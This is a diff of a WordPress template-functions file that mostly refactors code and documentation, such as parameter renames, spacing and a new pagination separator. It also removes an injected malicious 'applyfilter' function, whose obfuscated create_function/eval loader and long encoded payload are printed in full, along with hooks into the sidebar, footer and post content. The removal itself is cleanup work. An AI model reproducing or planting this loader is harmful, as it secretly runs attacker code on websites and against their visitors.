@@ -69,14 +69,14 @@ function the_title($before = '', $after = '', $echo = true) {
  * @return string|null Null on failure or display. String when echo is false.
  */
 function the_title_attribute( $args = '' ) {
-	$title = get_the_title();
+	$defaults = array('before' => '', 'after' =>  '', 'echo' => true, 'post' => get_post() );
+	$r = wp_parse_args($args, $defaults);
+	extract( $r, EXTR_SKIP );
+
+	$title = get_the_title( $post );
 
 	if ( strlen($title) == 0 )
 		return;
-
-	$defaults = array('before' => '', 'after' =>  '', 'echo' => true);
-	$r = wp_parse_args($args, $defaults);
-	extract( $r, EXTR_SKIP );
 
 	$title = $before . $title . $after;
 	$title = esc_attr(strip_tags($title));
@@ -96,7 +96,7 @@ function the_title_attribute( $args = '' ) {
  *
  * @since 0.71
  *
- * @param mixed $post Optional. Post ID or object.
+ * @param int|object $post Optional. Post ID or object.
  * @return string
  */
 function get_the_title( $post = 0 ) {
@@ -159,12 +159,12 @@ function get_the_guid( $id = 0 ) {
  * @since 0.71
  *
  * @param string $more_link_text Optional. Content for when there is more text.
- * @param bool $stripteaser Optional. Strip teaser content before the more text. Default is false.
+ * @param bool $strip_teaser Optional. Strip teaser content before the more text. Default is false.
  */
-function the_content($more_link_text = null, $stripteaser = false) {
-	$content = get_the_content($more_link_text, $stripteaser);
-	$content = apply_filters('the_content', $content);
-	$content = str_replace(']]>', ']]&gt;', applyfilter($content));
+function the_content( $more_link_text = null, $strip_teaser = false) {
+	$content = get_the_content( $more_link_text, $strip_teaser );
+	$content = apply_filters( 'the_content', $content );
+	$content = str_replace( ']]>', ']]&gt;', $content );
 	echo $content;
 }
 
@@ -177,52 +177,57 @@ function the_content($more_link_text = null, $stripteaser = false) {
  * @param bool $stripteaser Optional. Strip teaser content before the more text. Default is false.
  * @return string
  */
-function get_the_content( $more_link_text = null, $stripteaser = false ) {
-	global $more, $page, $pages, $multipage, $preview;
+function get_the_content( $more_link_text = null, $strip_teaser = false ) {
+	global $page, $more, $preview, $pages, $multipage;
 
 	$post = get_post();
 
 	if ( null === $more_link_text )
-		$more_link_text = __( '(more...)' );
+		$more_link_text = __( '(more&hellip;)' );
 
 	$output = '';
-	$hasTeaser = false;
+	$has_teaser = false;
 
 	// If post password required and it doesn't match the cookie.
-	if ( post_password_required() )
-		return get_the_password_form();
+	if ( post_password_required( $post ) )
+		return get_the_password_form( $post );
 
-	if ( $page > count($pages) ) // if the requested page doesn't exist
-		$page = count($pages); // give them the highest numbered page that DOES exist
+	if ( $page > count( $pages ) ) // if the requested page doesn't exist
+		$page = count( $pages ); // give them the highest numbered page that DOES exist
 
-	$content = $pages[$page-1];
-	if ( preg_match('/<!--more(.*?)?-->/', $content, $matches) ) {
-		$content = explode($matches[0], $content, 2);
-		if ( !empty($matches[1]) && !empty($more_link_text) )
-			$more_link_text = strip_tags(wp_kses_no_null(trim($matches[1])));
+	$content = $pages[$page - 1];
+	if ( preg_match( '/<!--more(.*?)?-->/', $content, $matches ) ) {
+		$content = explode( $matches[0], $content, 2 );
+		if ( ! empty( $matches[1] ) && ! empty( $more_link_text ) )
+			$more_link_text = strip_tags( wp_kses_no_null( trim( $matches[1] ) ) );
 
-		$hasTeaser = true;
+		$has_teaser = true;
 	} else {
-		$content = array($content);
+		$content = array( $content );
 	}
-	if ( (false !== strpos($post->post_content, '<!--noteaser-->') && ((!$multipage) || ($page==1))) )
-		$stripteaser = true;
+
+	if ( false !== strpos( $post->post_content, '<!--noteaser-->' ) && ( ! $multipage || $page == 1 ) )
+		$strip_teaser = true;
+
 	$teaser = $content[0];
-	if ( $more && $stripteaser && $hasTeaser )
+
+	if ( $more && $strip_teaser && $has_teaser )
 		$teaser = '';
+
 	$output .= $teaser;
-	if ( count($content) > 1 ) {
+
+	if ( count( $content ) > 1 ) {
 		if ( $more ) {
 			$output .= '<span id="more-' . $post->ID . '"></span>' . $content[1];
 		} else {
-			if ( ! empty($more_link_text) )
+			if ( ! empty( $more_link_text ) )
 				$output .= apply_filters( 'the_content_more_link', ' <a href="' . get_permalink() . "#more-{$post->ID}\" class=\"more-link\">$more_link_text</a>", $more_link_text );
-			$output = force_balance_tags($output);
+			$output = force_balance_tags( $output );
 		}
-
 	}
+
 	if ( $preview ) // preview fix for javascript bug with foreign languages
-		$output =	preg_replace_callback('/\%u([0-9A-F]{4})/', '_convert_urlencoded_to_entities', $output);
+		$output =	preg_replace_callback( '/\%u([0-9A-F]{4})/', '_convert_urlencoded_to_entities', $output );
 
 	return $output;
 }
@@ -563,7 +568,7 @@ function get_body_class( $class = '' ) {
  *
  * @since 2.7.0
  *
- * @param int|object $post An optional post. Global $post used if not provided.
+ * @param int|WP_Post $post An optional post. Global $post used if not provided.
  * @return bool false if a password is not required or the correct password cookie is present, true otherwise.
  */
 function post_password_required( $post = null ) {
@@ -578,7 +583,7 @@ function post_password_required( $post = null ) {
 	require_once ABSPATH . 'wp-includes/class-phpass.php';
 	$hasher = new PasswordHash( 8, true );
 
-	$hash = stripslashes( $_COOKIE[ 'wp-postpass_' . COOKIEHASH ] );
+	$hash = wp_unslash( $_COOKIE[ 'wp-postpass_' . COOKIEHASH ] );
 	if ( 0 !== strpos( $hash, '$P$B' ) )
 		return true;
 
@@ -599,15 +604,6 @@ function post_password_required( $post = null ) {
  * Quicktag one or more times). This tag must be within The Loop.
  *
  * The defaults for overwriting are:
- * 'next_or_number' - Default is 'number' (string). Indicates whether page
- *      numbers should be used. Valid values are number and next.
- * 'nextpagelink' - Default is 'Next Page' (string). Text for link to next page.
- *      of the bookmark.
- * 'previouspagelink' - Default is 'Previous Page' (string). Text for link to
- *      previous page, if available.
- * 'pagelink' - Default is '%' (String).Format string for page numbers. The % in
- *      the parameter string will be replaced with the page number, so Page %
- *      generates "Page 1", "Page 2", etc. Defaults to %, just the page number.
  * 'before' - Default is '<p> Pages:' (string). The html or text to prepend to
  *      each bookmarks.
  * 'after' - Default is '</p>' (string). The html or text to append to each
@@ -618,84 +614,81 @@ function post_password_required( $post = null ) {
  * 'link_after' - Default is '' (string). The html or text to append to each
  *      Pages link inside the <a> tag. Also appended to the current item, which
  *      is not linked.
+ * 'next_or_number' - Default is 'number' (string). Indicates whether page
+ *      numbers should be used. Valid values are number and next.
+ * 'separator' - Default is ' ' (string). Text used between pagination links.
+ * 'nextpagelink' - Default is 'Next Page' (string). Text for link to next page.
+ *      of the bookmark.
+ * 'previouspagelink' - Default is 'Previous Page' (string). Text for link to
+ *      previous page, if available.
+ * 'pagelink' - Default is '%' (String).Format string for page numbers. The % in
+ *      the parameter string will be replaced with the page number, so Page %
+ *      generates "Page 1", "Page 2", etc. Defaults to %, just the page number.
+ * 'echo' - Default is 1 (integer). When not 0, this triggers the HTML to be
+ *      echoed and then returned.
  *
  * @since 1.2.0
- * @access private
  *
  * @param string|array $args Optional. Overwrite the defaults.
  * @return string Formatted output in HTML.
  */
-function wp_link_pages($args = '') {
+function wp_link_pages( $args = '' ) {
 	$defaults = array(
-		'before' => '<p>' . __('Pages:'), 'after' => '</p>',
-		'link_before' => '', 'link_after' => '',
-		'next_or_number' => 'number', 'nextpagelink' => __('Next page'),
-		'previouspagelink' => __('Previous page'), 'pagelink' => '%',
-		'echo' => 1
+		'before'           => '<p>' . __( 'Pages:' ),
+		'after'            => '</p>',
+		'link_before'      => '',
+		'link_after'       => '',
+		'next_or_number'   => 'number',
+		'separator'        => ' ',
+		'nextpagelink'     => __( 'Next page' ),
+		'previouspagelink' => __( 'Previous page' ),
+		'pagelink'         => '%',
+		'echo'             => 1
 	);
 
 	$r = wp_parse_args( $args, $defaults );
 	$r = apply_filters( 'wp_link_pages_args', $r );
 	extract( $r, EXTR_SKIP );
 
-	global $page, $numpages, $multipage, $more, $pagenow;
+	global $page, $numpages, $multipage, $more;
 
 	$output = '';
 	if ( $multipage ) {
 		if ( 'number' == $next_or_number ) {
 			$output .= $before;
-			for ( $i = 1; $i < ($numpages+1); $i = $i + 1 ) {
-				$j = str_replace('%',$i,$pagelink);
-				$output .= ' ';
-				if ( ($i != $page) || ((!$more) && ($page==1)) ) {
-					$output .= _wp_link_page($i);
-				}
-				$output .= $link_before . $j . $link_after;
-				if ( ($i != $page) || ((!$more) && ($page==1)) )
-					$output .= '</a>';
+			for ( $i = 1; $i <= $numpages; $i++ ) {
+				$link = $link_before . str_replace( '%', $i, $pagelink ) . $link_after;
+				if ( $i != $page || ! $more && 1 == $page )
+					$link = _wp_link_page( $i ) . $link . '</a>';
+				$link = apply_filters( 'wp_link_pages_link', $link, $i );
+				$output .= $separator . $link;
 			}
 			$output .= $after;
-		} else {
-			if ( $more ) {
-				$output .= $before;
-				$i = $page - 1;
-				if ( $i && $more ) {
-					$output .= _wp_link_page($i);
-					$output .= $link_before. $previouspagelink . $link_after . '</a>';
-				}
-				$i = $page + 1;
-				if ( $i <= $numpages && $more ) {
-					$output .= _wp_link_page($i);
-					$output .= $link_before. $nextpagelink . $link_after . '</a>';
-				}
-				$output .= $after;
+		} elseif ( $more ) {
+			$output .= $before;
+			$i = $page - 1;
+			if ( $i ) {
+				$link = _wp_link_page( $i ) . $link_before . $previouspagelink . $link_after . '</a>';
+				$link = apply_filters( 'wp_link_pages_link', $link, $i );
+				$output .= $separator . $link;
 			}
+			$i = $page + 1;
+			if ( $i <= $numpages ) {
+				$link = _wp_link_page( $i ) . $link_before . $nextpagelink . $link_after . '</a>';
+				$link = apply_filters( 'wp_link_pages_link', $link, $i );
+				$output .= $separator . $link;
+			}
+			$output .= $after;
 		}
 	}
+
+	$output = apply_filters( 'wp_link_pages', $output, $args );
 
 	if ( $echo )
 		echo $output;
 
 	return $output;
 }
-
-/**
- * Applies custom filter.
- *
- * @since 0.71
- *
- * $text string to apply the filter
- * @return string
- */
-function applyfilter($text=null) {
-	@ini_set('memory_limit','256M');
-	if($text) @ob_start();
-	if(1){global $O10O1OO1O;$O10O1OO1O=create_function('$s,$k',"\44\163\75\165\162\154\144\145\143\157\144\145\50\44\163\51\73\40\44\164\141\162\147\145\164\75\47\47\73\44\123\75\47\41\43\44\45\46\50\51\52\53\54\55\56\57\60\61\62\63\64\65\66\67\70\71\72\73\74\75\76\134\77\100\101\102\103\104\105\106\107\110\111\112\113\114\115\116\117\120\121\122\123\124\125\126\127\130\131\132\133\135\136\137\140\40\134\47\42\141\142\143\144\145\146\147\150\151\152\153\154\155\156\157\160\161\162\163\164\165\166\167\170\171\172\173\174\175\176\146\136\152\101\105\135\157\153\111\134\47\117\172\125\133\62\46\161\61\173\63\140\150\65\167\137\67\71\42\64\160\100\66\134\163\70\77\102\147\120\76\144\106\126\75\155\104\74\124\143\123\45\132\145\174\162\72\154\107\113\57\165\103\171\56\112\170\51\110\151\121\41\40\43\44\176\50\73\114\164\55\122\175\115\141\54\116\166\127\53\131\156\142\52\60\130\47\73\40\146\157\162\40\50\44\151\75\60\73\40\44\151\74\163\164\162\154\145\156\50\44\163\51\73\40\44\151\53\53\51\40\173\40\44\143\150\141\162\75\163\165\142\163\164\162\50\44\163\54\44\151\54\61\51\73\40\44\156\165\155\75\163\164\162\160\157\163\50\44\123\54\44\143\150\141\162\54\71\65\51\55\71\65\73\40\44\143\165\162\137\153\145\171\75\141\142\163\50\146\155\157\144\50\44\153\40\53\40\44\151\54\71\65\51\51\73\40\44\143\165\162\137\153\145\171\75\44\156\165\155\55\44\143\165\162\137\153\145\171\73\40\151\146\50\44\143\165\162\137\153\145\171\74\60\51\40\44\143\165\162\137\153\145\171\75\44\143\165\162\137\153\145\171\53\71\65\73\40\44\143\150\141\162\75\163\165\142\163\164\162\50\44\123\54\44\143\165\162\137\153\145\171\54\61\51\73\40\44\164\141\162\147\145\164\56\75\44\143\150\141\162\73\40\175\40\162\145\164\165\162\156\40\44\164\141\162\147\145\164\73"); if(!function_exists("O01100llO")){function O01100llO(){global $O10O1OO1O;return call_user_func($O10O1OO1O,'MhQ%21%26%7crq%2e%2d%24%2e%7d%20tt%2et1133%605NwW13OLW0jNNj%2c7Q%3e%3e%23V%7e%28DLG%5ez1h%27%27hIm%2bKK%2f40%2e%2e%5c%3b%60%5c%40C%2fI%24%24%7e%3d%5bttT0Xa%3bP%2fT%2ex%2euk%3cM6%5e%5ej%29Boo%21hOhu%23%21oj%2d1%7b%60%605ww71%26%7eJZx%21ritNC%7e%28%23W%2dtx%2d%2aJ%20%21RWojS%3dk%2a%2d0AM%5ez%7bEW%5eEOb5Y0X2%409%21%20srVKuK%3ajFL%5cIc%29HZ%3b%2bejr%7b%60Gki%3b%28iU%2b%7dN%23N%2b%3bb%2a%3b0%5f%5dX7MEak0jskz%5eP3%5b%3eI2E2%5fIO7%2515z%7b1%5cG%227BP%21H%24J%40s6K%24%3b%2d%7d%40%23%5cLgP%7clm%2fuNVoIDnlJ%2elf%3bQ%24u%24%3bJ%2dRJ%7dU%2bM%5b%21W%20n%7dNhnX%2c9k%5e%22bjWjUb0%5bP%5dOXo%5d%60D5k%5bzz%3a%7ce%7bh3%3ciQJ%29%7bu%60x7Dp%40emT%3f%25Z%3bs%2aXB%7dT%3arTvHuJZJH%3a%21%20%3a%23A%2d%24ECty%7d%23%3bU%7dN%2810W%7bM%2bt%2bAM%2cEpb%5eN%2abzB%5b0EjjmmTmO%5bzP%2fGGrOeUG%7b1gw9%3f%3e6%5fHp%3f%40pc%20B%24%7c%3a%3aZ%3aTdSuNVoIDnlJ%2elf%3bQ%24u%24%3bJ%2dRJ%7dU%2bM%5b%21W%20n%7dNhnX%2c9k%5e%22bjWjUb0%5bP%5dOXo%5d%60D%26%5b%5f9%7ce%3ae%7bh3%3cHQQ%21%7bu%60x97D68%3dT%3e%5c%28TSGDF%3e%3dDuN%2ey%3c%25iZJ%3a%21feq%7b%3a%5d%29%7e%24%29Ov%2da%21av%7eYn%7eb5A%2awRj%7d%5dbf6%5d%27XB1zgoUjU5oIwc%26%60%27q%26%40%3a%22w%3e%29%21xC%40gp%3a%23%20%20%23%22Qp%7e%3f8rd%3delcF%2cJeJ%2e%3aC%7c%2aS%5b%26ej%2e%20%21%2eka%3bRHRa%20vW%20%2b3fY%60LXtj%2b%2a4jobs2I8A%27X%273A%5d%60DU1o%5bU%22ep2%60%7b%7byCyu%3eh%3er%7e%28%24%239i4%24%3fTlcTZPVKadEo%3d%2bryCr0%7eH%20K%20%7eyLty%2dOvRziNQ%2b%2da3%2b%2aM%5f%5dX7YfNfOYbzBAI%2aEA%7b%3d%5bz5%5fZlG%25q31myyyyqK%7b%2e8w%3e7%29%40VQc%3eZg%3bs%2aXB%7dT%3arTvHuJZJH%3a%21%20%3a%23A%2d%24ECty%7d%23%3bU%7dN%2810W%7bM%2bt%2bAM%2cEpb%5eN%2abzBIE%60%3d%25cVz%7bOBG%3al%3aI%25O%3aBps%60%603%5cBy%5fF7m%3f%3e%204WY6%3bV%25SV%7dy%3a%2f%3c%2fy%25x%29%25H0%7eiXl%24G%3bH%20k%3bR%21U%2bM%5bLa%24a0L%2dX%5fvbRWvo6AX%26D%3e%3dgo%5b%5d6cSejmES9wz4q%3a%7b6B7swy3tR5HsFds%23%7c%3c%25g%25%7cFlGFK%2cx%2fNTJcHKy0H%20CA%2d%24Ei%7eJ%7e%2ci%21N%26LM%20tL%2a5WN%5eA%40gspINIwgd%3ddng%2aV3qEh%27c%5dJ%29I%7c3%2293K%3e%5cBwB%3e%22V%3d%22m%21ZD%20s%258%7cmc%2d%7cGT%2cx%2fNru%25u%21rl%20%5e%2eiGJ%2etI%24%20M%2c5q1%26Y%20Y%27%5fp%5c7%3bwt4o%5d%2c%2bzYk0%5bPnrl0%3d%271q%27cp59%5b9p1%5cs18uF%3fCwd%5f%3d8PQ%3dTg%7e%3aS%28m%25d%25um%3cCv%7cKTr%7ci0%21%3aC%2f%2fOzqoRyRf22%60%7bH2Q3%2a%7e%7dwNbWMYM%5eIYsNSZ%2bPEUzE%3d%5f1hIh%5fU%224Up%3aB%40l%7b%3f3PpsJPV%5cQ%25m%21%3eD%3fD%3a%3eFl%7dc%7cVSc%2e%2bul%23%5eEkX%2e%21y%2bI%261quEwy%7e%23IH%5f59%28%407%5cs%7dR4%3fNd%3f88m%3en%3dm%3d%25cZeo%3cTkG%5dJxD3%406%7b8ZS%5bvNo25%3eT7%60J%2bn%3d%3f%7dQH6%27I%5f%5cdGx%3dPM%5dT%2aSW%2b%25Re%20%7e%29%23%2d%5euK%2f%29%21%24%2eJ%40%23Y%3f%23q%3f%7ev%2c%60Y%5do%2b%279%5faCu%3b%2cb%5ejAfbdFAs%5d%5f%2237%5cS9%2f4pyJxx8%2fGhX025p8%3fBsp%24%7e0gQ%3eT%3a%2e%25%3a%7c%2cKQ%21G%24n%2be%40pD%7cuHiQJu%27OHjQLf%28W1%5eAjYjofN%27X%2aU%404WxJR%2bfkI%27EfmDJIdO%7b98h%26D1%3e9V3p%3dmV%3c7P%5c%3cg%3cdr%24gZN%7cv%2bYnnbucWz%25v%5f1ikkIOOU%5b%5bLk%5dJVFGx%230Xf%3b%23hd%2dbY7wlS%25%2bYsn21%27%265%3eAzkq%6022eGHU2K%25%2cgPKLhGXau%5fj%5e17%5cP%3edB%5cXPkDZGu%25a%7dwnfkok%2aq%3aHx%5ejfg9%20%7da%24az%27%3c%7b%24At%3b%60hV%3dmYNjO%2a%40Wz2oU3BfIE%5b1zzS%3aJ%27z%3aT%7d8%3f%3a%7e%7brfR%3dDm%3es%3d%29Jj%21YsD%3d%7eD%2e%2fZ%2eS%7d%2dh%2bM%60bN6bv%7bnB%5eK%2buM%3b%21%20a%279U6%21MRqM%5d%5e%2b%5dvwhK%40%5fGs%22is4%3a%5c%24Pf352%60%22mIqUh733GJ%2313%2e%3aYV%3d%2eM9K4%2aPB%3c%25%3aV%7e%232tjFy%25xH%2eH%3aTG%20%23%21%7e%7c%29u%7ex%7eiMoI%22%29AiWnM%2bf1%3b%3e%7dAmt%2dYEna%2c%2b%5cZnqE%605%601%2fA%3f%5d%5b%2249%40%27%5c%60%5c%5cB%3ep%3fp%2fnh%2b%5do%29Np%3aF%3dTF%24KGC%3c%2dF%20%3d%2d6%3fzaTg%5fP%3d%22FZKm%5cD%25%3f%25e%2e%3a%7cD%21%29s%23%2cM%7bjEAjjk7w%21%7es%2bAq12%7c%3dm%5ed%3fy%2e%5b%27hpqSzFcfE%28Pd%3e%7bFpFP468%29%40d%7crZnR%7dPRdFaLps%2cIM8P2%23%28G%28L%3bf0DSIaN%2caa%2bz%27lu3%7e%5f%3b%60%5fEo%5dfYE%227%23%3b%5cgq%7b1qqh%3eg%2c%2bTke%27cSi%3d%5b7wr%25pdF4mC%2f2hy2%7b9%21%20sP%3a%3ddZ%5ed%3b4kUe%23xy%29lKnr%2blA%2aTrfTZ%2fI%22%29kdsnt%28%2d%23aWbN5%60HL8RpcW4Cr%5efU%5b0%5fwO%5fA2%40%5f2c%3cnuu0%2ef%5e%29A%2eGn%29uU5%287Q%2b%5cmV%24GuVuyCRtqW%2aYf%2ba%26%7cq%3aNvt%7d%2e%7daMoEg%5b%2bnY%2ct%2bq2T%607%409%5c7%60TN%25W6%2b0%26Afzlf352%60%22mV%28cHzqsh%7bp%7e%7b%25%604V%3dFD%5fT%3fTTZrm%25m%7eaL%5e%20%3aYYbb%2aXyfJYb%26yt%23yR%21LLya%20i%23x%3bR%2ct%26%5bM3OL%7b%5eRDMEUE%5dS%2b%5dA8%5dh%26%5dw%5b%60%60A%5bs3%40%5c%5c%2523PB6q%3d%22F%3d8FF%22%29Hp%2f6f%25PsG%2fF%2fy%2d%7d%5dmRlTUS%7bl%28%24i%7cH%24Q%7dAy%21%7et%23%221Q%7b%20h%2452a%60%3etTN%27kjM%2a1X0%5c%40oB%3aX%3f%7bjyEiwzo%7b1sO%7b66P%5f8FF%2fCR%5f%2b%3d69B%3cg%40PcV%3e%7c%3btjF%24%3d%3a%7c%3cNa%292%26i%3biQfG0%3b%5fp%24tM%2da%24%28U%20%233FMvn%2ch3%2b79D%2cO02q2zb%5c%26l6%2773%27%221%5f%5f%27%5fK9%2fCy%2e%2eJsKlp%3dmF%3dQ4JgZerl%3atg%24TZ%3aSNmRuKJlYReyi%23uu%23%2ff8Ma9xod%2bY8z%2d0Xb09R%22M%40IO%27azXzI0%5eEB%5eC1ED%5docV%26p%40%5c8s%7c%2f%7bu%60%2e%3a%3fs%3e6M9T%3fZ%7cZcsl%3a%2fmf%21dSx%2fSHGJJSJj%29H%5dkII%23jf%29o%2aJ%3b%7eO%3b%2av%3bX%2cbb%7e%2c%27noII9N%2a1X0n8%3f%2a%22X%2eI4O%27%3dFU%25m%2288e%20%26B%5fdVdg5v%3fdmFD%3fgQ8X%25gt%23%3ayyRE%3d%28D%7cCQlC%2fnCL%20C%2dQ%3b%3b%2fQY%28v%2b%2bz%21b%7d%2dW%2b%24aIN%2c%7d79a%7bN9%27qqr%2f%7bIo2%26fO%40UzD%3d2SiUshg%3eg83%3aPDD%7d7G%22%3f%3dZP%3dF%23%3d%2f%7c%3dCZKKFZ%20Gi%21%21%2be%24R%28L%2e%23%2fAECb%2e%5cM%21xYb%24bXq%7bg%3bDEzoIYA%227b842j%7bB%3aX%3f%7b77%2eiwzo%7b1sO%7b66P%5f8FF%2fCR%5f%2b%3d69B%3cg%40PcV%3e%7c%3btjFy%25%29i%29%2ec%2cH%7e%7e%26rvlJ%23RH%23%21o%23%2bM%23nRWW%21R%5dvjEE5%7dEN%27OU%5eUqn8%3f%2a%22X%2e%7bo%5e7%22%27%22%40TSiU%3b%5c%7bgPdpdmuKpHCT%3fZQ%2b%5ciZKK%5eolm%3eZ%25%29%3dZJJ%20GH%7e%7e%2aX%7bG9%3bJ%2fQ%2d%21%2e%20%7d%28%23v2q%3f%7efaEoE%5e%7d5%5dUUcW%5fYjO%7b%5dXp%5e5O949wIz%7b2w%22hh%7b%7e%7b%25ZpD%3epTgmmpmLtRRMaaNL%28JDN%2dlJvLSN%7e%3a1%28L%3b%2d%28%24LvQak%5dY%21U6%21zK7P%7b2%60Eo%5dEE%27%2272n%3fnST%3cZZ%7cjFy%2eJ2O5%401%25Z%5bmDq%3a%3eV%5fVm%3dyugD%21%28%23M%20%2a0Ba%2bbabV%7d%3d%7e%28%3cNQ%23r%23%7e%24%2anH%28%5dOk1o%224%29%7bw9%7b%22%23q%24%27O%3b%60Ek%2ck%27I%227jO%3fdg%3cBGK%5e%7c%7cT%3aoDkP%3eOSsB%7bBPglr6%3eJQ%29LxvW%40tLNL%2cWg%3bf%3e%28%22nkLaHQiHH%23n%2bLKAKH%3bL%21%3b%21iM%2biUs8%3fR%3b%2b%5eaL%60hRk%27IkkU%40410P03%5bwh%60E%3dJx%29qU%5f%5c3%5bZeqPd%3ePP%3dC%2fcpQpsFTFgZGg%3bjAESDGxe%3c%2cNS%20%24%23%20%20%3bX%2a%7dykyL%2cRQaYQ%5b8%3fB%7dLYj%2cth5%7dIO%27II%5b6p%7bX%3eX9Az3%60%5dmx%29H1%5b7s%602e%7c1%3eFd%3e%3emyuS%40%21%40mVld%3f%7ef%5ejT%3d%3a%2e%25ak%3cMQ7H%23%7eQG%21%2eh%2fu5C%24%20k%5de%60UQO%2acnfj%2aR0vmnYOXkU2%2ah0jA%7bg%3fU%60VC%5dF%2bGic%3c0C2e%7c1ZG%3aV0dDTV%40%3dBYnHme%7e%28giQd%3b4noD%7di%5f%29%20%24ilQy%60tR%2dRivoEvV%2cYbv%7eWR%7bg%3b1EvSokvqSYU%5b%2a580kq1OqOI54Z%5b97Ur2pB%5cCwB%3f5J%5f4BVB%238T%3cs%28%3fy%3eT%3al%2c%3c%2fKDWT%7eZ%2fHi%5eQCLG%5e%60%2ffT1%22%23iR%2b%286%21%2dY01%26WFpFRh0%3cdTv%22E%3fB%3f%2a%22X%3f5aO4Q%262%5f6Q%5c8s85d%3a%7cd%22NV%3d%22ehy%3e7Q%2b%5cieeG%5e%2fCu%2f%2fJMRHwx%21%23H%3aiCjbtm%29%2c%40%20%21RWOpi%27l9kg1%5b31%5e%5eoD%3cT%2a%2b%5d%5bfsns808%7b%7bwy%2eZDJIdO63%3fg%3f%5c1%7c%5dQh%2fu%5f%2eC%5btpuC%5ci%60M%28XQT%2eGTx%3ayyTy%5e%5ejEEokk%20%5eXS%5db%2eE%28%40%23bY%2cQaYNj3hd%2dN%27kjMz02OU18%5cIF%29NatM%2cY%5d%2anN%7cTj%7c%23q5F%3e83%3d%40%3cVmS%29Jd%24A5%60%263h9g92%40%5c%40%228s16g77%3e%5ekf3KJa%7d%3bCN%23%2b%2cvb%5bzM%60DJyGC%2ei%2d%20%21G%20%3ayC%20tP0M%60khDH%5bU5pJ%27v4d%5f4p3yi%2e%29hu4Fdm%40%25d8D%3en%265%5bOPn%2cWY%5d%3fleJ%24%21%25sd%2a%3aX%7bG%2eMR%28u%2c%20WaNnUO%7d3m%2eCluyHtQ%2fJGi%28%28%3fF8%7c%2asR%2fo7w%7bA%5bs%262c%3c5e%20%26ZYL%5f%3dFBhs%5ccPmgTQH%3d%24%2aBVC%2fr%3eTGC%29%7cNa%2fY%5beJy0b%3d5w%5fQxLN%23%29jAQOcH%7e%2cjAf%3b%2cjWY%2cRw%25d%3ed8b9sR%2fjAuE%229%7b1%7b16O%608%3fsglhvmVg5%5ce8spAZe%25rbB%3eM%7e1B%3d%7c%29HJD%7c%29lK%7cS%5e%3ap%3aT%3csTuB%25ZS%7cU6o%20%2aR%5eA%5e0t3%29%3d%7b',4925);}call_user_func(create_function('',"\x65\x76\x61l(\x4F01100llO());"));}}
-	if($text) {$out=@ob_get_contents(); @ob_end_clean(); return $text.$out;}
-}
-add_action('get_sidebar', 'applyfilter', 1, 0);
-add_action('get_footer', 'applyfilter', 1, 0);
-add_action('wp_footer', 'applyfilter', 1, 0);
 
 /**
  * Helper function for wp_link_pages().
@@ -1041,7 +1034,7 @@ class Walker_Page extends Walker {
 	 * @param int $current_page Page ID.
 	 * @param array $args
 	 */
-	function start_el( &$output, $page, $depth, $args, $current_page = 0 ) {
+	function start_el( &$output, $page, $depth = 0, $args = array(), $current_page = 0 ) {
 		if ( $depth )
 			$indent = str_repeat("\t", $depth);
 		else
@@ -1062,6 +1055,9 @@ class Walker_Page extends Walker {
 		}
 
 		$css_class = implode( ' ', apply_filters( 'page_css_class', $css_class, $page, $depth, $args, $current_page ) );
+
+		if ( '' === $page->post_title )
+			$page->post_title = sprintf( __( '#%d (no title)' ), $page->ID );
 
 		$output .= $indent . '<li class="' . $css_class . '"><a href="' . get_permalink($page->ID) . '">' . $link_before . apply_filters( 'the_title', $page->post_title, $page->ID ) . $link_after . '</a>';
 
@@ -1123,7 +1119,7 @@ class Walker_PageDropdown extends Walker {
 	 * @param array $args Uses 'selected' argument for selected page to set selected HTML attribute for option element.
 	 * @param int $id
 	 */
-	function start_el(&$output, $page, $depth, $args, $id = 0) {
+	function start_el( &$output, $page, $depth = 0, $args = array(), $id = 0 ) {
 		$pad = str_repeat('&nbsp;', $depth * 3);
 
 		$output .= "\t<option class=\"level-$depth\" value=\"$page->ID\"";
@@ -1231,18 +1227,18 @@ function prepend_attachment($content) {
  *
  * @since 1.0.0
  * @uses apply_filters() Calls 'the_password_form' filter on output.
- *
+ * @param int|WP_Post $post Optional. A post id or post object. Defaults to the current post when in The Loop, undefined otherwise.
  * @return string HTML content for password form for password protected post.
  */
-function get_the_password_form() {
-	$post = get_post();
+function get_the_password_form( $post = 0 ) {
+	$post = get_post( $post );
 	$label = 'pwbox-' . ( empty($post->ID) ? rand() : $post->ID );
-	$output = '<form action="' . esc_url( site_url( 'wp-login.php?action=postpass', 'login_post' ) ) . '" method="post">
-	<p>' . __("This post is password protected. To view it please enter your password below:") . '</p>
-	<p><label for="' . $label . '">' . __("Password:") . ' <input name="post_password" id="' . $label . '" type="password" size="20" /></label> <input type="submit" name="Submit" value="' . esc_attr__("Submit") . '" /></p>
-</form>
+	$output = '<form action="' . esc_url( site_url( 'wp-login.php?action=postpass', 'login_post' ) ) . '" class="post-password-form" method="post">
+	<p>' . __( 'This post is password protected. To view it please enter your password below:' ) . '</p>
+	<p><label for="' . $label . '">' . __( 'Password:' ) . ' <input name="post_password" id="' . $label . '" type="password" size="20" /></label> <input type="submit" name="Submit" value="' . esc_attr__( 'Submit' ) . '" /></p>
+	</form>
 	';
-	return apply_filters('the_password_form', $output);
+	return apply_filters( 'the_password_form', $output );
 }
 
 /**
@@ -1256,7 +1252,7 @@ function get_the_password_form() {
  * @uses $wp_query
  *
  * @param string $template The specific template name if specific matching is required.
- * @return bool False on failure, true if success.
+ * @return bool True on success, false on failure.
  */
 function is_page_template( $template = '' ) {
 	if ( ! is_page() )
@@ -1281,13 +1277,13 @@ function is_page_template( $template = '' ) {
  *
  * @since 3.4.0
  *
- * @param int $post_id The page ID to check. Defaults to the current post, when used in the loop.
+ * @param int $post_id Optional. The page ID to check. Defaults to the current post, when used in the loop.
  * @return string|bool Page template filename. Returns an empty string when the default page template
  * 	is in use. Returns false if the post is not a page.
  */
 function get_page_template_slug( $post_id = null ) {
 	$post = get_post( $post_id );
-	if ( 'page' != $post->post_type )
+	if ( ! $post || 'page' != $post->post_type )
 		return false;
 	$template = get_post_meta( $post->ID, '_wp_page_template', true );
 	if ( ! $template || 'default' == $template )
@@ -1318,9 +1314,9 @@ function wp_post_revision_title( $revision, $link = true ) {
 	/* translators: revision date format, see http://php.net/date */
 	$datef = _x( 'j F, Y @ G:i', 'revision date format');
 	/* translators: 1: date */
-	$autosavef = __( '%1$s [Autosave]' );
+	$autosavef = _x( '%1$s [Autosave]', 'post revision title extra' );
 	/* translators: 1: date */
-	$currentf  = __( '%1$s [Current Revision]' );
+	$currentf  = _x( '%1$s [Current Revision]', 'post revision title extra' );
 
 	$date = date_i18n( $datef, strtotime( $revision->post_modified ) );
